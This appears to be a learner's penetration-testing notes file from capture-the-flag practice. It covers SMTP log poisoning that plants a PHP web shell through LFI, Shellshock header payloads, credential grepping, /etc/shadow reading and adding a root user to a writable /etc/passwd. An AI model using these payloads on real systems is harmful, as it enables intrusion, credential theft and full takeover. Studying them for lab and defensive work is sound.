Will organize things along the way 😌

When port 25 is open, and we have found an LFI on the server, then we can perform LFI2RCE through SMPT Log Poisoning. There are two ways (as far as I know) to do it. I'm going to
cover the one I have experience with.

First, read /etc/passwd through LFI and get interesting users. Then, connect to SMTP with

```
telnet <ip address> 25 (nc should work too)
```
Verify the users like so:
```
VRFY $user@localhost
```
If we get back

252 2.0.0 $user@localhost

Then we are good and we can syntax the malicious mail
```
mail from: temp
rcpt to: $user@localhost
data
Subject: Bruh
<?php echo system($_REQUEST['cmd']); ?>
.
```
Then we can go ahead and close our connection with ```quit```. Now, this mail is stored in the user's /var/mail file. Since we added a valid php script in the mail, it was passed
into the file, and we can freely use the cmd parameter to execute commands in the system and have it echo them back to us. Now we can pass e.g. a reverse shell.

References:
https://janithmalinga.github.io/redteam/ctf/2020/02/12/Using-LFI-and-SMTP-to-get-a-Shell.html
https://www.hackingarticles.in/smtp-log-poisioning-through-lfi-to-remote-code-exceution/ (the other way is specified here)
https://www.youtube.com/watch?v=XJmBpOd__N8

-------------------------------------------------------------------------

Beep from HTB had a possible RCE exploit which was based on VoIP. For now I don't know the whole concept, but I think I understand a general way of attacking VoIP. Essentially,
devices in a network are given an extension, i.e. a number by which they can be identified by the PBX server. So we try to find the extensions that are open, and attack them. In
a real-life scenario we probably intercept the traffic during the authentication phase and dump the creds, in boxes not really 😩 (unless bots exist)
https://www.exploit-db.com/docs/english/18136-paper-enumerating-and-breaking-voip.pdf


I'm gonna let this nicely written piece of text do the explanation for me
```
When a web server uses the Common Gateway Interface (CGI) to handle a document request, it passes various details of the request to a handler program in the environment variable list. For example, the variable HTTP_USER_AGENT has a value that, in normal usage, identifies the program sending the request. If the request handler is a Bash script, or if it executes one for example using the system(3) call, Bash will receive the environment variables passed by the server and will process them as described above. This provides a means for an attacker to trigger the Shellshock vulnerability with a specially crafted server request. Security documentation for the widely used Apache web server states: "CGI scripts can ... be extremely dangerous if they are not carefully checked." and other methods of handling web server requests are often used. There are a number of online services which attempt to test the vulnerability against web servers exposed to the Internet.
```
TLDR if cgi-bin exists, then a possible entry point is shellshock. We can try testing for this manually by changing the headers to ```() { :;}; echo; echo 1```
Notice the second echo. It might be necessary for the exploit to work and write out the proper output. Another way we can check is though the nmap script engine
```
nmap -sV -p<ports> --script http-shellshock --script-args uri=<path>,cmd=ls <target>
```
Some PointsOfInformation. It may be necessary to execute a script by calling its absolute path

```
() {:;}; echo; /bin/ls
```

References:
https://nmap.org/nsedoc/scripts/http-shellshock.html
https://en.wikipedia.org/wiki/Shellshock_(software_bug)
https://github.com/opsxcq/exploit-CVE-2014-6271
https://www.youtube.com/watch?v=IBlTdguhgfY


------------------------------------------------------------

If we gain access to a webserver (I'd say this applies more to low priv
access), and the machine is running PHP and a database, then we can search
for credentials to connect to said database. We could try something like:
```
grep -r <pattern-here> ./*
```
For the pattern we can use words like password, database, username, and once
we find an interesting one, we can search the file from which it came from.


## Privilege Escalation

### Enumeration

#### System Enumeration
`uname` is a linux command that prints system information. Different flags can be used, but for convenience sake use -a for all. Different files that can also give system information are */proc/version* and */etc/issue*
To get information on CPU architecture, run `lscpu`. Informations like sockets and core counts can determine whether exploits can be used or not.
To list services, run `ps aux`.

#### User Enumeration
Two commands to get the current user are
```
whoami
id
```
Of these, id is better because it gives more information about the gid of the user, and the groups he belongs in.
To get the commands the user can run as root, we run `sudo -l`
To get all the users in a system, we can read the */etc/passwd* file. We can get them with
`cut /etc/passwd -d : -f 1` (yup you don't have to cat and pipe)
Check the permissions of some files, like */etc/passwd* and */etc/groups*
Run ``history`` to get previous commands

#### Network Enumeration
To identify open ports and communication between the host system and other machines, run `netstat -ano`

### Exploitation

#### Kernel
To identify kernel version, run `uname -a` as listed above, and paste the version to google. Another way is through [linux exploit suggester](https://github.com/mzet-/linux-exploit-suggester), which automatically identifies CVEs, so it can find them. Below are some interesting links on linux kernel exploits:
-https://chao-tic.github.io/blog/2017/05/24/dirty-cow
-https://github.com/xairy/linux-kernel-exploitation

#### Passwords
To search for files with passwords potentially in them, execute the below commands
```
grep --color=auto -rin PASSWORD / 2> /dev/null
find / -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
```
We can modify them based on what we want. We can change the path from which they start (e.g. '/', '.', '/var/www/html;, '/opt', ...) or the pattern they search for (PASSWORD, PASSWORD=, PASS=, ...)
To automate the process we can use tools like linpeas.
**NOTE!** We can also search for passwords on binary files with `strings`

#### File Permissions

Depending on the OS the **/etc/passwd** & **/etc/shadow** files may be different. We can view their permission with these commands
```
#Passwd equivalent files
ls -l /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
ls -l /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
The important things to watch out is if **/etc/passwd** is writeable for a user or group we have access to, and if **/etc/shadow** is similarly writeable.
If /etc/passwd is writeable, we can add our own user, and we can give him root permissions by exploiting the [/etc/passwd syntax](https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/). We definitely want to give him a uid and gid of 0, and **/root** as home dir. So we get this line `hacker:HASH_HERE:0:0:Hacker:/root:/bin/bash`. We can use one of the below lines to generate a valid hash
```
openssl passwd -1 -salt pass pass
mkpasswd -m SHA-512 pass
python2 -c 'import crypt; print crypt.crypt("pass", "$6$pass")'
```
So we get the line `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`
We can also add a line with no password hash `echo 'hacker::0:0:Hacker:/root/bin/bash`, remove the x from the root user, or change our user's uid, gid, and home fields. Be careful however as this decreases the security of the system

If **/etc/shadow** is readable, then we have the hashes of the users and we can easily crack them with **hashcat** or **JtR**. View [this](https://null-byte.wonderhowto.com/how-to/crack-shadow-hashes-after-getting-root-linux-system-0186386/) link to learn more on that. To identify the hash mode for the tools, use [hashid](https://github.com/psypanda/hashID)

#### Sudo Shell Escaping

One of the most important commands when privescing is `sudo -l`, showing the list of allowed commands for the invoking user on the host. The best way to exploit the binaries shown is with [gtfobins](https://gtfobins.github.io/). If something doesn't appear there, then we google it.


